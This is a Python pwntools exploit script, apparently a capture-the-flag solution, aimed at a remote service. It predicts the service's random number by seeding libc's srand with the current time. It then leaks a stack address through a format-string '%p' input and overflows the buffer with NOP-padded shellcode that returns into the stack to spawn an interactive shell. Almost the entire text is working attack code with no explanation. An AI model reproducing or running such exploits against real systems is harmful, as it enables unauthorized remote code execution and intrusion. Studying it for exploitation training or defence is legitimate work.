from pwn import *
import time
from ctypes import CDLL

def readline(c):
	line = c.recvline().decode()
	print("[PROGRAM]", line, end='')
	return line

def readuntil(c, ending: bytes):
	lines = c.recvuntil(ending).decode()

	for line in lines.splitlines():
		print("[PROGRAM]", line)
	return lines

def sendline(c, line):
	if type(line) is str:
		line = line.encode()

	print("[LOCAL]", line.decode(), end='' if line.endswith(b'\n') else '\n')
	c.sendline(line)

# ============
# LOGIC
# ============
context.clear()
context.arch = 'amd64'
libc = CDLL("libc.so.6")

HOST = "34.45.81.67"
PORT = 16004

RET_ADDR = 0x178 #-0x178(rbp)
BUF_ADDR = 0x170 #-0x170(rbp)
FORMATTED_ADDR = 0x4a #-0x4a(rbp)

conn = remote(HOST, PORT)
now = int(time.time())
libc.srand(now)

readuntil(conn, b'>')
sendline(conn, b"Tilden")

readuntil(conn, 'how many honks?')

nhonks = libc.rand() % 0x5b + 0xa
print(f'[DEBUG] {nhonks=}')
sendline(conn, f'{nhonks}')

readuntil(conn, 'what\'s your name again?')

sendline(conn, '<BUF>%p<BUF>') #this should give us %rsi <--- which contains -0x4a(%rbp)

line = readuntil(conn, 'leave to the world?')

match = re.search(r'<BUF>0x[0-9a-fA-F]+<BUF>', line)
buf_addr = int(match.group(0).split('<BUF>')[1], 16) - (BUF_ADDR - FORMATTED_ADDR)
print(f'[DEGUB] {hex(buf_addr)=}')

shellcode = asm(shellcraft.sh()) 
payload = shellcode.ljust(RET_ADDR, b'\x90') 
payload += p64(buf_addr) 

conn.send(payload)

readuntil(conn, b'bye now.')

# Get shell
conn.interactive()
